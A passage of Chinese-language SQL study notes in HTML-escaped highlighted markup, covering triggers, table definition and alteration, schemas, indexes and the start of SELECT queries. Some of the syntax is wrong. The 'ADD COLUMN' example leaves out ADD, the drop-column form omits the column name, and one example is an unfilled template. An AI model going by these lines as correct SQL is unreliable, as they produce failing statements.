&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCING&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;OLD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;NEW&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FOR&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EACH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ROW&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;BEGIN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#7f848e&#34;&gt;-- 检查条件
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;IF&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;THEN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#7f848e&#34;&gt;-- 这是块内的第一条语句，用 ; 结尾
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;OldGrade&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;NewGrade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IF&lt;/span&gt;; &lt;span style=&#34;color:#7f848e&#34;&gt;-- IF语句也需要用 ; 结尾
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 3. 使用新的定界符 // 来结束整个 CREATE TRIGGER 命令
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 4. 将定界符改回默认的 ;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELIMITER&lt;/span&gt; ;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;激活触发器&#34;&gt;激活触发器
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;多个触发器执行顺序：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;执行BEFORE触发器 -&amp;gt; 激活触发器的SQL语句 -&amp;gt; 执行AFTER触发器&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;删除触发器&#34;&gt;删除触发器
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP TRIGGER 触发器名 ON 表名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;定义基本表&#34;&gt;定义基本表
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TABLE 表名&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;(列名1 数据类型 列级完整性约束条件,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;列名n 数据类型 列级完整性约束条件,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;表级完整性约束条件1,&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;表级完整性约束条件n&lt;/strong&gt;&lt;/mark&gt;
&lt;mark&gt;&lt;strong&gt;);&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;VARCHAR&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;NUMBER&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;INT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;),     &lt;span style=&#34;color:#7f848e&#34;&gt;-- 多个主码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FOREIGN&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCES&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;在模式中定义表&#34;&gt;在模式中定义表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;一个模式包含很多基本表，有三种方式在模式里面定义基本表&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建表的时候指出模式&#34;&gt;创建表的时候指出模式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TABLE 模式名.表名();&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建模式时直接定义表&#34;&gt;创建模式时直接定义表
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE SCHEMA 模式名 AUTHORIZATION 用户名 CREATE TABLE 表名();&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;事先设置所属的模式&#34;&gt;事先设置所属的模式
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SET SCHEMA &amp;lsquo;my_schema&amp;rsquo;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;my_schema&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;my_table&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;INT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;VARCHAR&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;100&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;my_table 将被创建在 my_schema 模式下&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改基本表&#34;&gt;修改基本表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;同样的，修改表时想要指定模式里面的表，就使用“模式名.表名”的方式指定表名&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;增加新的属性列&#34;&gt;增加新的属性列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 ADD 新列名 数据类型 完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加时间列Time：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;DATE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然，还能在ADD后面加上修饰词COLUMN，这样会更容易理解是在添加列，&lt;strong&gt;对功能没有影响&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COLUMN&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;DATE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                    &lt;span style=&#34;color:#56b6c2&#34;&gt;~~~~~~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;增加列级完整性约束条件&#34;&gt;增加列级完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE SC ADD 列级完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加Grade列必须取唯一值的条件：（Grade必须要已经存在）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UNIQUE&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;增加表级完整性约束条件&#34;&gt;增加表级完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE SC ADD 表级完整性约束条件;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.向TAB1里增加Ch为外码的条件，参照表是TAB2：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ADD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FOREIGN&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;KEY&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCES&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除列&#34;&gt;删除列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP CASCADE;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：引用了该列的其他对象（例如视图）一起删除&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP RESTRICT;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：若该列被其他对象引用，则拒绝删除&lt;/p&gt;
&lt;h4 id=&#34;删除指定的完整性约束条件&#34;&gt;删除指定的完整性约束条件
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 DROP CONSTRAINT 完整性约束名 CASCADE/RESTRICT;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;修改列&#34;&gt;修改列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER TABLE 表名 ALTER COLUMN 列名 数据类型;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.把Grade由INT型修改成字符型：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TABLE&lt;/span&gt; 表名 &lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COLUMN&lt;/span&gt; 列名 数据类型；
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;删除基本表&#34;&gt;删除基本表
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP TABLE 表名 CASCADE;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：把表相关的依赖对象（比如视图）一并删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP TABLE 表名 RESTRICT;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：如果此表被其他表依赖（外码）或者有视图等，拒绝被删除&lt;/p&gt;
&lt;h2 id=&#34;索引&#34;&gt;索引
&lt;/h2&gt;&lt;h3 id=&#34;建立索引&#34;&gt;建立索引
&lt;/h3&gt;&lt;h4 id=&#34;建立唯一索引&#34;&gt;建立唯一索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE UNIQUE INDEX 索引名 ON 表名(列名1 次序,列名n 次序);&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;唯一索引&lt;/strong&gt; 是关于&lt;strong&gt;数据值是否唯一&lt;/strong&gt;的，它强制数据的唯一性，并帮助快速查找特定值&lt;/p&gt;
&lt;p&gt;eg.为表TAB1按照学号升序和时间降序建立唯一的索引：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UNIQUE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INDEX&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewIndex&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ASC&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Time&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DESC&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;ASC&lt;/strong&gt;：asceding，&lt;strong&gt;升序&lt;/strong&gt;
&lt;strong&gt;DESC&lt;/strong&gt;：descending，&lt;strong&gt;降序&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;建立聚簇索引&#34;&gt;建立聚簇索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE CLUSTER INDEX 索引名 ON 表名(列名1 次序,列名n 次序);&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;聚簇索引&lt;/strong&gt; 是关于&lt;strong&gt;数据如何物理存储&lt;/strong&gt;的，它把数据和索引紧密地绑定在一起，让查找和范围查询非常快&lt;/p&gt;
&lt;h4 id=&#34;重命名索引&#34;&gt;重命名索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;ALTER INDEX 旧索引名 RENAME TO 新索引名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.把TAB1表的NewIndex索引重命名为OldIndex：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ALTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INDEX&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewIndex&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;RENAME&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldIndex&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除索引&#34;&gt;删除索引
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP INDEX 索引名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;查询数据select语句&#34;&gt;查询数据&amp;ndash;SELECT语句
&lt;/h2&gt;&lt;h3 id=&#34;一般格式&#34;&gt;一般格式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;SELECT ALL/DISTINCT 目标列表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FROM 表名/视图名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;GROUP BY 列名 HAVING 条件表达式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;ORDER BY 列名 次序;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h3 id=&#34;select-目标列表达式&#34;&gt;SELECT 目标列表达式
&lt;/h3&gt;&lt;h4 id=&#34;查询指定的列&#34;&gt;查询指定的列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT 列名1，列名n&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1的Ch列和Nu列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;查询全部的列&#34;&gt;查询全部的列
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;SELECT *&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.查询TAB1的全部记录：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
